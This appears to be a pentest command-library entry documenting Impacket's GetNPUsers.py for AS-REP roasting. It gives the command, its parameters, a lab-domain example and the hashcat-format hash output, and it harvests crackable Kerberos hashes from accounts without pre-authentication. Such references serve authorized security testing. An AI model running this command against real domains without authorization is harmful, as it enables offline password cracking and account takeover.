---
id: new-uuid-4
name: getnpusers-as-rep-roast
type: command
executor: bash
data: >-
  GetNPUsers.py $_DOMAIN/ -usersfile users.txt -format hashcat -outputfile
  asrep_hashes.txt -dc-ip $_DC_IP
output: |
  $krb5asrep$23$USER@DOMAIN:abcdef123456...
created_at: '2023-01-01T00:00:00+00:00'
updated_at: '2023-06-01T00:00:00+00:00'
platforms:
  - Linux
tags:
  - kerberos
  - roasting
verified: true
validated: true
---

# getnpusers-as-rep-roast

## Command

```bash
GetNPUsers.py $_DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip $_DC_IP
```

## Description

Requests AS-REP for users in file, outputting crackable hashes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Domain name | Yes |
| -usersfile users.txt | Username list | Yes |
| -format hashcat | Output format | Yes |
| -outputfile asrep_hashes.txt | Output file | Yes |
| -dc-ip $_DC_IP | DC IP | Yes |

## Examples

### Basic Usage

```bash
GetNPUsers.py lab.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip 192.168.1.10
```

## Expected Output

Hashcat-formatted AS-REP hashes in file.
